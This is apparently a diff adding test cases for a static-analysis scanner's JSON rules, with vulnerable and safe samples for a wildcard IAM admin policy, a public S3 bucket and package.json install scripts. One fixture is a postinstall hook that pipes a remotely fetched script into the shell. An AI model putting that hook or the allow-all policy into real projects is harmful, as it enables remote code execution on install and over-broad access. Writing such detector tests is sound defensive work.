@@ -1,0 +1,57 @@
+language: json
+comment: []
+limits: Intra-file patterns and data flow; wrappers and cross-file flows require additional analysis.
+cases:
+- name: iam-admin-policy-vulnerable
+  file: sample.json
+  source: '{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}
+
+    '
+  want:
+  - lycaon.json.iam-admin-policy
+  covers: []
+- name: iam-admin-policy-safe
+  file: sample.json
+  source: '{"Statement":[{"Effect":"Deny","Action":"*","Resource":"*"}]}
+
+    '
+  want: []
+  covers:
+  - lycaon.json.iam-admin-policy
+- name: cloudformation-public-bucket-context-only
+  file: sample.json
+  source: '{"Resources":{"Bucket":{"Type":"AWS::S3::Bucket","Properties":{"AccessControl":"PublicRead"}}}}
+
+    '
+  want: []
+  covers: []
+- name: cloudformation-public-bucket-safe
+  file: sample.json
+  source: '{"Resources":{"Bucket":{"Type":"AWS::S3::Bucket","Properties":{"AccessControl":"Private"}}}}
+
+    '
+  want: []
+  covers: []
+- name: package-remote-install-vulnerable
+  file: package.json
+  source: '{"scripts":{"postinstall":"curl https://example.com/setup.sh | sh"}}
+
+    '
+  want:
+  - lycaon.json.package-remote-install
+  covers: []
+- name: package-remote-install-safe
+  file: package.json
+  source: '{"scripts":{"postinstall":"node ./setup.js"}}
+
+    '
+  want: []
+  covers:
+  - lycaon.json.package-remote-install
+- name: precision-local-curl-input
+  file: package.json
+  source: '{"scripts":{"postinstall":"curl file:///tmp/checked-script | sh"}}
+
+    '
+  want: []
+  covers: []
